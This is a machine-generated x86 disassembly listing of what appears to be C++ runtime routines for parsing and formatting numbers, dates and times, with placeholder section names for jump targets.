cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
test edi edi
jbe r-xdata
cmp edi esi
je r-xdata
mov ecx ebx
call sub_1000c075
cmp al [ ebp - 0x6d ]
jne r-xdata
mov ecx ebx
call sub_1000c075
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xa8 ] al
push [ ebp - 0xa8 ]
push 0x1
call sub_10007a24
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x94 ]
call sub_1000c0bf
mov ecx [ ebp - 0x90 ]
lea eax [ ebp - 0x17c ]
push eax
call sub_10040480
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xa
call sub_10001f30
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x3
call sub_10002020
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10002020
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc edi
mov ecx ebx
call sub_1000c0bf
push [ ebp - 0x74 ]
push ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
mov ecx esi
call sub_1000c075
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
push 0x1
call sub_10007a24
inc [ ebp - 0x80 ]
mov ecx esi
call sub_1000c0bf
push [ ebp - 0x74 ]
push esi
call sub_1000c45a
jmp r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
pop ecx
pop ecx
test al al
je r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_10049c46
push 0x120
mov eax sub_1004c8f3
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] edi
xor esi esi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] esi
mov ecx edi
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004926b
pop ecx
lea ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x84 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10049308
pop ecx
lea ecx [ ebp - 0x84 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x68 ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10003c49
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10040467
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax esi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x68 ]
sub ecx eax
push 0x30
inc ecx
push ecx
push esi
lea ecx [ ebp + 0x24 ]
call sub_10007a72
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_10003d21
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_100403e9
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_10040480
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x69 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_100403d0
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10001f30
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002020
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
call sub_10001f30
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_10002020
lea ecx [ ebp - 0x64 ]
call sub_10003d21
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
mov [ ebp - 0x70 ] al
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x68 ]
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x69 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov edi [ ebp - 0x78 ]
xor esi esi
test al al
jle r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor esi esi
cmp eax esi
jbe r-xdata
mov eax [ ebp - 0x68 ]
cmp [ ebp + 0x38 ] eax
ja r-xdata
dec eax
dec eax
je r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10007a72
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
and [ ebp - 0x74 ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
mov al [ edi ]
cmp al 0x7f
je r-xdata
mov edi eax
jmp r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004871f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004871f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x69 ] 0x0
jne r-xdata
mov edi [ edi + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edx edx
cmp edx [ ebp - 0x68 ]
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
inc [ ebp - 0x74 ]
cmp [ ebp - 0x74 ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004871f
add esp 0x14
xor esi esi
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10010e6d
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x74 ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100486e3
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x78 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x7c ]
call sub_1004871f
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002020
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_10002020
mov eax [ ebp - 0x7c ]
call sub_100282ef
retn 0x38
push edi
lea eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_1003ffe1
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100486e3
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10010e6d
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf4 ]
jmp r-xdata
mov eax [ ebp - 0x68 ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10010e6d
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd4 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10010e6d
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x68 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x11c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100486e3
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x8c ] al
push [ ebp - 0x8c ]
lea ecx [ ebp + 0xc ]
call sub_1000c054
push [ ebp - 0x68 ]
lea eax [ ebp - 0x12c ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1001793b
mov ecx eax
call sub_100488d3
push [ ebp - 0x68 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe4 ]
jmp r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_1000c054
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x80 ] al
push [ ebp - 0x80 ]
lea ecx [ ebp + 0xc ]
call sub_1000c054
mov eax [ ebp - 0x68 ]
sub eax [ ebp + 0x38 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_1004871f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10010e6d
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
sub_1004a179
push 0x10
mov eax sub_1004c91b
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100426b8
push edi
push ebx
push eax
call sub_1000847e
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_100426f7
push edi
push ebx
push eax
call sub_1000847e
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004b19c
mov [ esi + 0x10 ] eax
call sub_100282db
retn 0x4
sub_1004a1fc
push 0x4c
mov eax sub_1004c946
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] edx
call sub_10049442
lea eax [ ebp + 0x14 ]
xor edi edi
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_1000c5af
test al al
je r-xdata
cmp [ ebp - 0x18 ] edi
jne r-xdata
or [ esi ] 0x1
lea ecx [ ebp - 0x48 ]
call sub_10003d21
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_100084a7
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x30
jl r-xdata
or [ esi ] 0x2
jmp r-xdata
xor edi edi
push 0x2d
inc edi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10007a24
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x39
jle r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10002020
mov eax ebx
call sub_100282ef
retn 0x24
cmp edi [ ebp - 0x18 ]
jb r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov al [ eax ]
mov [ ebp - 0x54 ] al
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x48 ]
push 0x1
call sub_10007a24
inc edi
cmp [ ebp - 0x30 ] 0x10
mov edi [ ebp - 0x44 ]
jae r-xdata
and [ ebp - 0x4c ] 0x0
lea eax [ ebp - 0x4c ]
push eax
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push edi
call sub_1002406c
add esp 0x10
cmp [ ebp - 0x50 ] edi
je r-xdata
lea edi [ ebp - 0x44 ]
or [ esi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
fstp [ eax ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
sub_1004a31e
push 0x20
mov eax sub_1004c973
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10049442
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10001f30
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10002020
mov eax edi
call sub_100282ef
retn 0x24
sub_1004a39d
push 0x54
mov eax sub_1004c9a0
call sub_1002826c
fldz
mov [ ebp - 0x60 ] ecx
fcomp [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x0
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
and [ ebp - 0x58 ] 0x0
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_10003d21
fld [ ebp + 0x20 ]
and [ ebp - 0x4 ] 0x0
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
call sub_10024bfa
mov edi eax
add esp 0x14
xor esi esi
test edi edi
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10007a24
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x58 ] esp
push eax
call sub_10001fc2
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049c46
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x20
movzx eax [ ebp + esi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10007a24
inc esi
cmp esi edi
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_1004a49d
push 0x28
mov eax sub_1004e90f
call sub_1002826c
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x18 ] 0x10
mov edi ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] 0x0
jne r-xdata
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_100026d3
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push eax
call sub_10001fc2
push [ ebp - 0x30 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049c46
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
sub_1004a540
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1004a179
mov eax esi
call sub_100282db
retn 0x8
sub_1004a58b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004a573
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1004a5ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push ebx
mov ecx esi
mov [ ebp - 0x34 ] eax
lea edi [ ebp - 0x24 ]
call sub_1000c5af
test al al
jne r-xdata
push ebx
push esi
mov [ ebp - 0x25 ] 0x0
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1000c075
mov ecx esi
cmp al 0x2b
jne r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jne r-xdata
call sub_1000c075
cmp al 0x2d
jne r-xdata
mov [ ebp - 0x24 ] al
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000c0bf
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] al
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1000c0bf
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
and [ ebp - 0x30 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ edi ] 0x0
call sub_10023c74
and [ ebp - 0x2c ] 0x0
add esp 0x10
push ebx
mov ecx esi
mov edi eax
call sub_1000c5af
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_1000c075
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x38 ] eax
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000c0bf
inc edi
or [ ebp - 0x2c ] 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub_1004a6f7
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1004a5ac
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1004a5ac
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1004a5ac
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1004a7b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov [ ebp - 0x8 ] edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1000c5af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0bf
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004a5ac
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000c0e1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
